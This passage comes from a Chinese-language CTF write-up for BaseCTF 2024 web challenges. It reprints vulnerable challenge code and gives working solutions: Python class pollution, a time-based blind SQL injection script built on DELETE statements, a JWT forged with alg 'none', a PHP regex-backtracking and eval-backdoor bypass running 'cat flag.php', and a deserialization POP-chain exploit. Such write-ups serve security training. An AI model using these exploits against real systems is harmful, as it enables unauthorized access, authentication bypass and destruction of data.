</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/pollute&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>Pollution</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>is_json:
</span></span><span style=display:flex><span>        merge(json<span style=color:#f92672>.</span>loads(request<span style=color:#f92672>.</span>data),instance)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;J1ngHong说：钥匙圣洁无暇，无人可以污染！&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;J1ngHong说：圣钥暗淡了一点，你居然污染成功了？&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>run(host<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;0.0.0.0&#39;</span>,port<span style=color:#f92672>=</span><span style=color:#ae81ff>80</span>)
</span></span></code></pre></div><p>原理先按下不表，之后会出一篇文章学习一下原型链，主要是先写题目。大致就是利用merge函数来修改父类的属性</p><p>思路是利用/read下的<code>__file__</code>进行读取flag，想要利用这个，需要通过/pollute的传参就是污染，用merge对这个进行修改，同时<code>__file__</code>变量是一个全局值，就可以用上面写到的<code>__globals__</code>函数来获取全局变量并进行修改</p><p><img alt=zhan1 loading=lazy src=/posts/ctf/basectf2024/zhan1.png></p><p>注意的是需要添加头，否则不能读取成功<code>Content-Type: application/json</code></p><p>之后在/read刷新一下就出flag了，不能理解的看一下代码原理。</p><p><img alt=zhan2 loading=lazy src=/posts/ctf/basectf2024/zhan2.png></p><h3 id=only-one-sql>only one sql</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span>$sql <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;sql&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/select|;|@|\n/i&#39;</span>, $sql)) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;你知道的，不可能有sql注入&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/&#34;|\$|`|\\\\/i&#39;</span>, $sql)) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;你知道的，不可能有RCE&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>//flag in ctf.flag
</span></span></span><span style=display:flex><span>$query <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;mysql -u root -p123456 -e </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>use ctf;select &#39;没有select，让你执行一句又如何&#39;;&#34;</span> <span style=color:#f92672>.</span> $sql <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>system</span>($query);
</span></span></code></pre></div><p>首先执行<code>show databases</code>爆库看看，再执行爆表</p><p><img alt=sql1 loading=lazy src=/posts/ctf/basectf2024/sql1.png></p><p>猜测应该在flag里，执行一下爆列<code>show columns from flag</code></p><p><img alt=sql2 loading=lazy src=/posts/ctf/basectf2024/sql2.png></p><p>猜测在data里面，题目把正常的select给过滤了，提醒了盲注，本人sql其实不算擅长，根据官p来吧，正常的flag格式是B来头，我们可以利用delete和时间盲注进行探测，比如</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>?sql<span style=color:#f92672>=</span>delete from flag where data like <span style=color:#e6db74>&#39;B%&#39;</span> and sleep<span style=color:#f92672>(</span>5<span style=color:#f92672>)</span>
</span></span></code></pre></div><p><code>DELETE FROM flag</code>：从 <code>flag</code> 表中删除记录。<code>WHERE data LIKE 'B%'</code>：条件为 <code>data</code> 字段的值以字母 <code>B</code> 开头的记录会被选中。检测是否有B开头的.<code>SLEEP(5)</code> 会让数据库等待 5 秒再继续执行。最后写个脚本等慢慢跑出来就行</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> string
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>char <span style=color:#f92672>=</span> string<span style=color:#f92672>.</span>ascii_lowercase <span style=color:#f92672>+</span> string<span style=color:#f92672>.</span>digits <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;-&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>100</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> char:
</span></span><span style=display:flex><span>        url <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;http://challenge.basectf.fun:28963/?sql=delete%20from%20flag%20where%20data%20like%20%27</span><span style=color:#e6db74>{</span>flag<span style=color:#e6db74>}{</span>c<span style=color:#e6db74>}</span><span style=color:#e6db74>%25%27%20and%20sleep(5)&#39;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>            response <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url, timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> requests<span style=color:#f92672>.</span>exceptions<span style=color:#f92672>.</span>Timeout:
</span></span><span style=display:flex><span>            print(flag <span style=color:#f92672>+</span> c)  <span style=color:#75715e># 输出已猜出的 flag 部分</span>
</span></span><span style=display:flex><span>            flag <span style=color:#f92672>+=</span> c  <span style=color:#75715e># 将正确的字符加入 flag</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>  <span style=color:#75715e># 进入下一个字符的猜测</span>
</span></span></code></pre></div><h3 id=no-jwt>No JWT</h3><p>和平常写的jwt有点不太一样</p><p>接口需要一个包含角色为 <code>admin</code> 的 JWT 令牌才能返回 flag。为了得到 flag，需要伪造一个 JWT 令牌，绕过服务器端的角色检查。</p><p>签名验证已被禁用，可以伪造一个 JWT 令牌，其中 <code>role</code> 设置为 <code>admin</code>。接下来就是构造这个伪造的 JWT 令牌并发送请求到 <code>/flag</code> 接口。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> base64
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> json
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>flag_url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://challenge.basectf.fun:30617/flag&#39;</span> 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>header <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;alg&#34;</span>: <span style=color:#e6db74>&#34;none&#34;</span>,  <span style=color:#75715e># 禁用签名验证</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;typ&#34;</span>: <span style=color:#e6db74>&#34;JWT&#34;</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;sub&#34;</span>: <span style=color:#e6db74>&#34;admin&#34;</span>, 
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;role&#34;</span>: <span style=color:#e6db74>&#34;admin&#34;</span>,  <span style=color:#75715e># 设置为 admin</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;exp&#34;</span>: <span style=color:#ae81ff>9999999999</span>  <span style=color:#75715e># 过期时间设置在未来</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e># 对 header 和 payload 进行 Base64 编码</span>
</span></span><span style=display:flex><span>header_enc <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>urlsafe_b64encode(json<span style=color:#f92672>.</span>dumps(header)<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>rstrip(<span style=color:#e6db74>&#34;=&#34;</span>)
</span></span><span style=display:flex><span>payload_enc <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>urlsafe_b64encode(json<span style=color:#f92672>.</span>dumps(payload)<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>rstrip(<span style=color:#e6db74>&#34;=&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>fake_jwt <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>header_enc<span style=color:#e6db74>}</span><span style=color:#e6db74>.</span><span style=color:#e6db74>{</span>payload_enc<span style=color:#e6db74>}</span><span style=color:#e6db74>.&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>headers <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;Authorization&#39;</span>: <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Bearer </span><span style=color:#e6db74>{</span>fake_jwt<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>response <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(flag_url, headers<span style=color:#f92672>=</span>headers)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 打印服务器响应</span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;服务器响应状态码:&#34;</span>, response<span style=color:#f92672>.</span>status_code)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;服务器响应内容:&#34;</span>, response<span style=color:#f92672>.</span>text)
</span></span></code></pre></div><h1 id=fin>Fin</h1><h2 id=web-4>web</h2><h3 id=1z_php>1z_php</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>highlight_file</span>(<span style=color:#e6db74>&#39;index.php&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#75715e># 我记得她...好像叫flag.php吧？
</span></span></span><span style=display:flex><span>$emp<span style=color:#f92672>=</span>$_GET[<span style=color:#e6db74>&#39;e_m.p&#39;</span>];
</span></span><span style=display:flex><span>$try<span style=color:#f92672>=</span>$_POST[<span style=color:#e6db74>&#39;try&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($emp<span style=color:#f92672>!=</span><span style=color:#e6db74>&#34;114514&#34;</span><span style=color:#f92672>&amp;&amp;</span><span style=color:#a6e22e>intval</span>($emp,<span style=color:#ae81ff>0</span>)<span style=color:#f92672>===</span><span style=color:#ae81ff>114514</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> ($i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>;$i<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>strlen</span>($emp);$i<span style=color:#f92672>++</span>){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>ctype_alpha</span>($emp[$i])){
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;你不是hacker？那请去外场等候！&#34;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;只有真正的hacker才能拿到flag！&#34;</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&lt;br&gt;&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/.+?HACKER/is&#39;</span>,$try)){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;你是hacker还敢自报家门呢？&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>stripos</span>($try,<span style=color:#e6db74>&#39;HACKER&#39;</span>) <span style=color:#f92672>===</span> <span style=color:#66d9ef>TRUE</span>){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;你连自己是hacker都不承认，还想要flag呢？&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    $a<span style=color:#f92672>=</span>$_GET[<span style=color:#e6db74>&#39;a&#39;</span>];
</span></span><span style=display:flex><span>    $b<span style=color:#f92672>=</span>$_GET[<span style=color:#e6db74>&#39;b&#39;</span>];
</span></span><span style=display:flex><span>    $c<span style=color:#f92672>=</span>$_GET[<span style=color:#e6db74>&#39;c&#39;</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>stripos</span>($b,<span style=color:#e6db74>&#39;php&#39;</span>)<span style=color:#f92672>!==</span><span style=color:#ae81ff>0</span>){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;收手吧hacker，你得不到flag的！&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> (<span style=color:#66d9ef>new</span> $a($b))<span style=color:#f92672>-&gt;</span>$c();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;114514到底是啥意思嘞？。？&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e># 觉得困难的话就直接把shell拿去用吧，不用谢~
</span></span></span><span style=display:flex><span>$shell<span style=color:#f92672>=</span>$_POST[<span style=color:#e6db74>&#39;shell&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>eval</span>($shell);
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>第一层对emp进行传值，用小数点就可以绕过，注意php特性</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>e<span style=color:#f92672>[</span>m.p<span style=color:#f92672>=</span>114514.111
</span></span></code></pre></div><p>第二层非贪婪绕过，可以去看看p神的文章，了解一下原理，<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html?page=2#:~:text=PHP%E4%B8%BA%E4%BA%86%E9%98%B2%E6%AD%A2%E6%AD%A3">PHP利用PCRE回溯次数限制绕过某些安全限制</a>,只需要给HACKER前面加100w个就行了(ps：我没测最小值需要多少，直接量大管饱了)post发包</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>1000000</span><span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;HACKER&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(payload)
</span></span></code></pre></div><p>第三层进行原生类的读取，简要的介绍gpt来写</p><p><code>SplFileObject</code> 是 PHP 的一个内置类，继承自 <code>SplFileInfo</code>，用于处理文件的读写操作。它提供了许多方法来操作文件，类似于文件处理的面向对象接口。</p><p>使用 <code>SplFileObject</code> 的常见方法：</p><ul><li><strong><code>fgets()</code></strong>: 读取文件的一行。</li><li><strong><code>fwrite()</code></strong>: 写入内容到文件。</li><li><strong><code>fgetc()</code></strong>: 读取文件的一个字符。</li></ul><p><code>php://stdin</code> 是一个 PHP 的流包装器，表示标准输入流。这通常用于从命令行或其他输入流读取数据。</p><ul><li><strong><code>php://stdin</code></strong> 允许你读取从标准输入传入的数据，例如，通过命令行管道传递的数据。</li></ul><p><code>fgets()</code> 是 <code>SplFileObject</code> 提供的一个方法，用于从文件中读取一行。结合 <code>php://stdin</code>，它可以读取从标准输入传入的数据。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>a<span style=color:#f92672>=</span>SplFileObject&amp;b<span style=color:#f92672>=</span>php://stdin&amp;c<span style=color:#f92672>=</span>fgets
</span></span></code></pre></div><p>最后在post后面执行<code>system('cat flag.php');</code>就可以得到flag，看源码</p><h3 id=ez_php>ez_php</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__file__</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>substrstr</span>($data)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    $start <span style=color:#f92672>=</span> <span style=color:#a6e22e>mb_strpos</span>($data, <span style=color:#e6db74>&#34;[&#34;</span>);
</span></span><span style=display:flex><span>    $end <span style=color:#f92672>=</span> <span style=color:#a6e22e>mb_strpos</span>($data, <span style=color:#e6db74>&#34;]&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>mb_substr</span>($data, $start <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>, $end <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>-</span> $start);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Hacker</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $start;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $end;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $username<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;hacker&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>($start){
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>start</span><span style=color:#f92672>=</span>$start;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__wakeup</span>(){
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>username</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;hacker&#34;</span>;
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>end</span> <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>start</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__destruct</span>(){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/ctfer/i&#39;</span>,$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>username</span>)){
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;Hacker！&#39;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>C</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $c;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__toString</span>(){
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>c</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>c</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;C&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>T</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $t;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__call</span>($name,$args){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>t</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>t</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>F</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $f;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__get</span>($name){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>isset</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>f</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>f</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>E</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $e;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__isset</span>($name){
</span></span><span style=display:flex><span>        ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>e</span>)();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>R</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $r;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__invoke</span>(){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>eval</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>r</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;ez_ser.from_you&#39;</span>])){
</span></span><span style=display:flex><span>    $ctf <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Hacker</span>(<span style=color:#e6db74>&#39;{{{&#39;</span><span style=color:#f92672>.</span>$_GET[<span style=color:#e6db74>&#39;ez_ser.from_you&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;}}}&#39;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/\[|\]/i&#34;</span>, $_GET[<span style=color:#e6db74>&#39;substr&#39;</span>])){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;NONONO!!!&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    $pre <span style=color:#f92672>=</span> <span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;substr&#39;</span>])<span style=color:#f92672>?</span>$_GET[<span style=color:#e6db74>&#39;substr&#39;</span>]<span style=color:#f92672>:</span><span style=color:#e6db74>&#34;substr&#34;</span>;
</span></span><span style=display:flex><span>    $ser_ctf <span style=color:#f92672>=</span> <span style=color:#a6e22e>substrstr</span>($pre<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;[&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>serialize</span>($ctf)<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;]&#34;</span>);
</span></span><span style=display:flex><span>    $a <span style=color:#f92672>=</span> <span style=color:#a6e22e>unserialize</span>($ser_ctf);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Exception</span>(<span style=color:#e6db74>&#34;杂鱼~杂鱼~&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>晨曦✌出的太狠了，简单的先分析一下pop链，一下是依次触发的情况</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Hacker::__destruct <span style=color:#f92672>=</span>&gt; C::__toString <span style=color:#f92672>=</span>&gt; T::__call <span style=color:#f92672>=</span>&gt; F::__get <span style=color:#f92672>=</span>&gt; E::__isset <span style=color:#f92672>=</span>&gt; R::__invoke
</span></span></code></pre></div><p>接着考虑绕过__wakeup,使用&进行引用就可以绕过</p><p>需要注意的是由于最后有<code>throw new Exception("杂鱼~杂鱼~");</code>让__destruct不能正常触发，需要使用gc回收机制，参考<a href="https://xz.aliyun.com/t/11843?time__1311=Cq0xuD0DnD203GNem%3DDRDj2QDgGuQ7TQ4D&amp;u_atoken=0114403acb8b70492b4c518ca47812ae&amp;u_asig=1a0c380917263902773186410e0107">GC回收机制</a>,</p><p>exp</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Hacker</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $start;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $end;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $username<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;hacker&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__wakeup</span>(){
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>username</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;hacker&#34;</span>;
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>end</span> <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>start</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__destruct</span>(){
